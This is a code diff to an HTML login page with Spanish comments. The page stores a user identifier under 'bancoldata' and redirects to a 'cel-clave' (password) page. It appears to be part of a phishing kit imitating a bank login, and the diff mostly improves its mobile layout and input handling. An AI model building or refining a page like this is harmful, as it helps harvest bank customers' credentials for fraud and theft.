@@ -2,17 +2,30 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
   <title>Image-based Website with Loader</title>
   <style>
     * {
       margin: 0; padding: 0; box-sizing: border-box;
     }
-    body, html {
-      height: 100%; width: 100%;
+    html, body {
+      width: 100%;
+      min-height: 100%;
       background-color: #f0f0f0;
       overflow: hidden;
+      font-family: Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
     }
+    input, button {
+      -webkit-appearance: none;
+      appearance: none;
+      font-family: inherit;
+    }
+    input:focus {
+      outline: none;
+    }
+
     .loader-container {
       position: fixed; top: 0; left: 0;
       width: 100%; height: 100%;
@@ -101,9 +114,6 @@
       background-color: #ffffff;
       border: 1px solid black;
     }
-    .button-container button:first-child:hover {
-      background-color: #ffffff;
-    }
     .button-container button:last-child {
       background-color: #ffda37;
       color: black;
@@ -117,32 +127,26 @@
       background-color: #ffb800;
     }
 
-    /* 📱 Diseño responsivo para móviles */
     @media screen and (max-width: 480px) {
       .center-box {
         width: 85%;
         padding: 10px 15px;
       }
-
       .center-box .input-container input {
         font-size: 16px;
         padding: 8px 8px 8px 35px;
       }
-
       .center-box .input-container i {
         left: 8px;
         font-size: 15px;
       }
-
       #userError {
         font-size: 11px;
         margin-top: 3px;
       }
-
       .button-container {
         top: 75%;
       }
-
       .button-container button {
         padding: 12px 28px;
         font-size: 12px;
@@ -178,6 +182,7 @@
     window.onload = () => {
       document.getElementById('loader').style.display = 'none';
       document.getElementById('mainContent').style.display = 'block';
+      adjustButtonPosition(); // Ajuste inicial
     };
 
     const userInput = document.getElementById('userInput');
@@ -188,7 +193,6 @@
     userInput.addEventListener('input', () => {
       const value = userInput.value.trim();
       const isValid = value.length >= 6 && /\d/.test(value);
-
       if (isValid) {
         userError.style.display = 'none';
         continueButton.classList.add('enabled');
@@ -199,14 +203,6 @@
         continueButton.classList.remove('enabled');
         continueButton.classList.add('disabled');
         continueButton.disabled = true;
-      }
-    });
-
-    window.addEventListener('resize', () => {
-      if (window.innerHeight < 500) {
-        buttonContainer.style.top = '77%';
-      } else {
-        buttonContainer.style.top = '70.4%';
       }
     });
 
@@ -221,15 +217,24 @@
           console.error('Error al parsear bancoldata:', e);
           bancoldata = {};
         }
-
         bancoldata.usuario = userValue;
         localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
         window.location.href = 'cel-clave.html';
       }
     });
+
+    function adjustButtonPosition() {
+      const isSmallHeight = window.innerHeight < window.screen.height * 0.7;
+      buttonContainer.style.top = isSmallHeight ? '85%' : '70.4%';
+    }
+
+    window.addEventListener('resize', adjustButtonPosition);
+    window.addEventListener('orientationchange', adjustButtonPosition);
+    document.addEventListener('focusin', adjustButtonPosition);
+    document.addEventListener('focusout', adjustButtonPosition);
   </script>
 
-  <!-- Íconos de FontAwesome -->
+  <!-- FontAwesome -->
   <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
 </body>
 </html>
